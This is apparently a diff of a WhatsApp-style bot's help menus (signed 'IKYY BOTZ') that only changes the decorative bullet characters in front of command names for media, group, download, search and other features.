+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚒𝚍𝚎𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚐𝚒𝚏
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚞𝚛𝚕
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚟𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚖𝚙3
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚘𝚊𝚞𝚍𝚒𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚋𝚒𝚗𝚊𝚛𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚋𝚒𝚗𝚊𝚛𝚢
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚢𝚕𝚎𝚝𝚎𝚡𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚖𝚎𝚖𝚎
 ╰─────────────────╮
 ╭─────────────────╯
 │   〘 MAIN MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚙𝚒𝚗𝚐
-│➣ ${prefix}𝚘𝚠𝚗𝚎𝚛
-│➣ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
-│➣ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
-│➣ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
-│➣ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
-│➣ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚘𝚠𝚗𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚎𝚗𝚞 / 𝚑𝚎𝚕𝚙 / ?
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚎𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚏𝚘𝚌𝚑𝚊𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚙𝚌
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚙𝚎𝚎𝚍𝚝𝚎𝚜𝚝
 ╰─────────────────╮
 ╭─────────────────╯
 │〘 DATABASE MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
-│➣ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
-│➣ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
-│➣ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
-│➣ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
-│➣ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
-│➣ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚌𝚖𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚌𝚖𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚌𝚖𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚘𝚌𝚔𝚌𝚖𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚜𝚝𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚜𝚐
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚕𝚖𝚜𝚐
 ╰─────────────────╮
 ╭─────────────────╯
 │〘ANONYMOUS MENU〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
-│➣ ${prefix}𝚜𝚝𝚊𝚛𝚝
-│➣ ${prefix}𝚗𝚎𝚡𝚝
-│➣ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚘𝚗𝚢𝚖𝚘𝚞𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚛𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚡𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚎𝚕𝚞𝚊𝚛
 ╰─────────────────╮
 ╭─────────────────╯
 │  〘 ISLAMIC MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚒𝚚𝚛𝚊
-│➣ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
-│➣ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
-│➣ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
-│➣ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚚𝚛𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚍𝚒𝚜𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚕𝚚𝚞𝚛𝚊𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚞𝚣𝚊𝚖𝚖𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚏𝚜𝚒𝚛𝚜𝚞𝚛𝚊𝚑
 ╰─────────────────╮
 ╭─────────────────╯
 │  〘 VOICE MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚋𝚊𝚜𝚜
-│➣ ${prefix}𝚋𝚕𝚘𝚠𝚗
-│➣ ${prefix}𝚍𝚎𝚎𝚙
-│➣ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
-│➣ ${prefix}𝚏𝚊𝚜𝚝
-│➣ ${prefix}𝚏𝚊𝚝
-│➣ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
-│➣ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
-│➣ ${prefix}𝚛𝚘𝚋𝚘𝚝
-│➣ ${prefix}𝚜𝚕𝚘𝚠
-│➣ ${prefix}𝚝𝚞𝚙𝚊𝚒
-│➣ ${prefix}𝚕𝚞𝚜𝚒𝚊𝚙𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚊𝚜𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚗
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚎𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚊𝚛𝚛𝚊𝚙𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚜𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚒𝚐𝚑𝚝𝚌𝚘𝚛𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚟𝚎𝚛𝚜𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚘𝚋𝚘𝚝
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚕𝚘𝚠
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚞𝚙𝚊𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚞𝚜𝚒𝚊𝚙𝚊
 ╰─────────────────╮
 ╭─────────────────╯
 │ 〘 OWNER MENU 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
-│➣ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
-│➣ ${prefix}𝚕𝚎𝚊𝚟𝚎
-│➣ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
-│➣ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
-│➣ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚎𝚊𝚌𝚝 [𝚎𝚖𝚘𝚓𝚒]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚑𝚊𝚝 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚒𝚗 [𝚕𝚒𝚗𝚔]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚎𝚊𝚟𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚐𝚛𝚘𝚞𝚙 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚌𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚋𝚘𝚝 [𝚒𝚖𝚊𝚐𝚎]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚎𝚡𝚒𝚏
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚖𝚎𝚗𝚞 [𝚘𝚙𝚝𝚒𝚘𝚗]
 ╰─────────────────╮
 ╭─────────────────╯
 │    〘 THANKS TO 〙
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ akatsuki for unity
-│➣ zZz - x - team
-│➣ and my friends❤ 
+││᭄⃟ꪶ⃟•╾ akatsuki for unity
+││᭄⃟ꪶ⃟•╾ zZz - x - team
+││᭄⃟ꪶ⃟•╾ and my friends❤ 
 ╰─────────────────╯
 
 © ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
@@ -3786,26 +3789,26 @@ break
 │    ◪〘 GRUP MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
-│➣ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
-│➣ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
-│➣ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
-│➣ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
-│➣ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
-│➣ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
-│➣ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
-│➣ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
-│➣ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
-│➣ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚕𝚒𝚗𝚔𝚐𝚛𝚘𝚞𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚙𝚑𝚎𝚖𝚎𝚛𝚊𝚕 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚌 [𝚒𝚖𝚊𝚐𝚎]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚗𝚊𝚖𝚎 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚎𝚝𝚍𝚎𝚜𝚌 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚛𝚘𝚞𝚙 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚎𝚍𝚒𝚝𝚒𝚗𝚏𝚘 [𝚘𝚙𝚝𝚒𝚘𝚗]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚍𝚍 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚒𝚌𝚔 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚒𝚍𝚎𝚝𝚊𝚐 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚊𝚐𝚊𝚕𝚕 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔 [𝚘𝚗/𝚘𝚏𝚏]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚞𝚝𝚎 [𝚘𝚗/𝚘𝚏𝚏]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚛𝚘𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚖𝚘𝚝𝚎 @𝚞𝚜𝚎𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚟𝚘𝚝𝚎 [𝚝𝚎𝚡𝚝]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚎𝚟𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚙𝚟𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚎𝚔𝚟𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚊𝚙𝚞𝚜𝚟𝚘𝚝𝚎
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3822,14 +3825,14 @@ break
 │◪〘 WEBZONE MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
-│➣ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
-│➣ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
-│➣ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
-│➣ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
-│➣ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
-│➣ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
-│➣ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢𝚜𝚝𝚘𝚛𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚜𝚖𝚊𝚛𝚎𝚗𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚋𝚒𝚘𝚜𝚔𝚘𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚘𝚠𝚙𝚕𝚊𝚢𝚒𝚗𝚐𝚋𝚒𝚘𝚜𝚔𝚘𝚙
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚖𝚒𝚗𝚒𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚝𝚝𝚙𝚊𝚍
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚎𝚋𝚝𝚘𝚘𝚗𝚜
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚛𝚊𝚔𝚘𝚛
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3846,21 +3849,21 @@ break
 │◪〘DOWNLOAD MENU〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
-│➣ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚗𝚘𝚠𝚖 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚠𝚖 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙3 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚒𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚠𝚒𝚝𝚝𝚎𝚛𝚖𝚙3 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝𝚍𝚕 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙3 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚖𝚙4 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚖𝚞𝚜𝚒𝚌 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚎𝚝𝚟𝚒𝚍𝚎𝚘 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚞𝚖𝚖𝚊 [𝚞𝚛𝚕]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚓𝚘𝚘𝚡 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚘𝚞𝚗𝚍𝚌𝚕𝚘𝚞𝚍 [𝚞𝚛𝚕]
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3877,16 +3880,16 @@ break
 │ ◪〘 SEARCH MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
-│➣ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚕𝚊𝚢 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚐𝚒𝚖𝚊𝚐𝚎 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚒𝚗𝚝𝚎𝚛𝚎𝚜𝚝 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚕𝚕𝚙𝚊𝚙𝚎𝚛 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚒𝚔𝚒𝚖𝚎𝚍𝚒𝚊 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚛𝚒𝚗𝚐𝚝𝚘𝚗𝚎 [𝚚𝚞𝚎𝚛𝚢]
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚝𝚊𝚕𝚔 [𝚘𝚙𝚝𝚒𝚘𝚗] [𝚚𝚞𝚎𝚛𝚢]
 ╰─────────────────╯
  ▰▱▰▱▰▱▰▱▰▱▰▱▰
 
@@ -3903,23 +3906,23 @@ break
 │ ◪〘 RANDOM MENU 〙◪
 ╰─────────────────╮
 ╭─────────────────╯
-│➣ ${prefix}𝚌𝚘𝚏𝚏𝚎
-│➣ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
-│➣ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
-│➣ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
-│➣ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
-│➣ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
-│➣ ${prefix}𝚙𝚞𝚒𝚜𝚒
-│➣ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
-│➣ ${prefix}𝚊𝚗𝚒𝚖𝚎
-│➣ ${prefix}𝚠𝚊𝚒𝚏𝚞
-│➣ ${prefix}𝚑𝚞𝚜𝚋𝚞
-│➣ ${prefix}𝚗𝚎𝚔𝚘
-│➣ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
-│➣ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
-│➣ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
-│➣ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
-│➣ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚏𝚏𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚊𝚗𝚒𝚖𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚖𝚘𝚝𝚒𝚟𝚊𝚜𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚍𝚒𝚕𝚊𝚗𝚚𝚞𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚞𝚌𝚒𝚗𝚚𝚞𝚘𝚝𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚔𝚊𝚝𝚊𝚜𝚎𝚗𝚓𝚊
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚙𝚞𝚒𝚜𝚒
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚌𝚘𝚞𝚙𝚕𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚊𝚗𝚒𝚖𝚎
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚑𝚞𝚜𝚋𝚞
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚠𝚊𝚒𝚏𝚞𝚜 (𝚗𝚜𝚏𝚠)
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚗𝚎𝚔𝚘𝚜 (𝚗𝚜𝚏𝚠)
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚝𝚛𝚊𝚙 (𝚗𝚜𝚏𝚠)
+││᭄⃟ꪶ⃟•╾ ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋 (𝚗𝚜𝚏𝚠)
 ╰─────────────────╯
